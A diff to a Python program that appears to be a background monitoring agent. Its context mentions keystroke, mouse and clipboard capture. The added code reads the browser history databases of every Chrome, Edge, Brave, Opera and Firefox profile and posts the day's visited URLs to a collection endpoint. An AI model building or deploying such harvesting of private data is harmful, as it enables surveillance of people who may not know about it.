@@ -1,6 +1,8 @@
 import os
 import time
 import json
+import glob
+import sqlite3
 import argparse
 import atexit
 import base64
@@ -104,6 +106,7 @@ collection_paused = False
 update_lock = Lock()
 mouse_disable_lock = Lock()
 mouse_hook_callback = None
+browser_history_seen = set()
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -261,6 +264,119 @@ def get_browser_url(app_name):
     except Exception:
         return ""
     return ""
+
+
+def windows_filetime_to_epoch_ms(value):
+    try:
+        integer_value = int(value)
+    except (TypeError, ValueError):
+        return 0
+    return int((integer_value / 1000) - 11644473600000)
+
+
+def browser_history_paths():
+    local_appdata = os.getenv("LOCALAPPDATA") or os.path.join(os.path.expanduser("~"), "AppData", "Local")
+    roaming_appdata = os.getenv("APPDATA") or os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
+    pattern_map = [
+        ("Chrome", os.path.join(local_appdata, "Google", "Chrome", "User Data", "*", "History")),
+        ("Chrome", os.path.join(local_appdata, "Google", "Chrome", "User Data", "Default", "History")),
+        ("Edge", os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "*", "History")),
+        ("Edge", os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Default", "History")),
+        ("Brave", os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "*", "History")),
+        ("Brave", os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")),
+        ("Opera", os.path.join(local_appdata, "Opera Software", "Opera Stable", "History")),
+        ("Opera", os.path.join(local_appdata, "Opera Software", "Opera GX Stable", "History")),
+        ("Firefox", os.path.join(roaming_appdata, "Mozilla", "Firefox", "Profiles", "*", "places.sqlite")),
+    ]
+    discovered_paths = []
+    seen_paths = set()
+    for browser_name, pattern in pattern_map:
+        for candidate in sorted(glob.glob(pattern)):
+            normalized = os.path.normcase(os.path.abspath(candidate))
+            if normalized in seen_paths or not os.path.exists(candidate):
+                continue
+            seen_paths.add(normalized)
+            discovered_paths.append((browser_name, candidate))
+    return discovered_paths
+
+
+def collect_browser_history_entries(browser_name, db_path):
+    if not db_path or not os.path.exists(db_path):
+        return []
+
+    try:
+        connection = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
+    except sqlite3.DatabaseError:
+        return []
+
+    try:
+        if browser_name.lower() == "firefox":
+            query = """
+                SELECT p.url, p.title, h.visit_date
+                FROM moz_historyvisits h
+                JOIN moz_places p ON p.id = h.place_id
+                WHERE p.url LIKE 'http%' OR p.url LIKE 'https%'
+                ORDER BY h.visit_date DESC
+            """
+            rows = connection.execute(query).fetchall()
+            entries = []
+            for url, title, visit_date in rows:
+                if not url or not str(url).startswith(("http://", "https://")):
+                    continue
+                try:
+                    visited_at = int(int(visit_date) / 1000)
+                except (TypeError, ValueError):
+                    continue
+                if visited_at <= 0:
+                    continue
+                entries.append({
+                    "browser": browser_name,
+                    "url": str(url),
+                    "visited_at": visited_at,
+                })
+            return entries
+
+        query = """
+            SELECT url, title, last_visit_time
+            FROM urls
+            WHERE url LIKE 'http%' OR url LIKE 'https%'
+            ORDER BY last_visit_time DESC
+        """
+        rows = connection.execute(query).fetchall()
+        entries = []
+        for url, title, last_visit_time in rows:
+            if not url or not str(url).startswith(("http://", "https://")):
+                continue
+            visited_at = windows_filetime_to_epoch_ms(last_visit_time)
+            if visited_at <= 0:
+                continue
+            entries.append({
+                "browser": browser_name,
+                "url": str(url),
+                "visited_at": visited_at,
+            })
+        return entries
+    except (sqlite3.DatabaseError, sqlite3.OperationalError):
+        return []
+    finally:
+        connection.close()
+
+
+def sync_browser_history():
+    global browser_history_seen
+    today_start_ms = int(
+        datetime.now().astimezone().replace(hour=0, minute=0, second=0, microsecond=0).timestamp() * 1000
+    )
+
+    for browser_name, db_path in browser_history_paths():
+        for entry in collect_browser_history_entries(browser_name, db_path):
+            if entry["visited_at"] < today_start_ms:
+                continue
+            cache_key = (browser_name, entry["url"], entry["visited_at"])
+            if cache_key in browser_history_seen:
+                continue
+            if post_website_history(entry["url"], browser_name, entry["visited_at"]):
+                browser_history_seen.add(cache_key)
 
 
 def get_clipboard_text():
@@ -643,6 +759,7 @@ def website_history_sender():
             if collection_paused:
                 time.sleep(WEBSITE_HISTORY_INTERVAL_SECONDS)
                 continue
+            sync_browser_history()
             active_app = get_active_app()
             browser_url = get_browser_url(active_app)
             if not active_app:
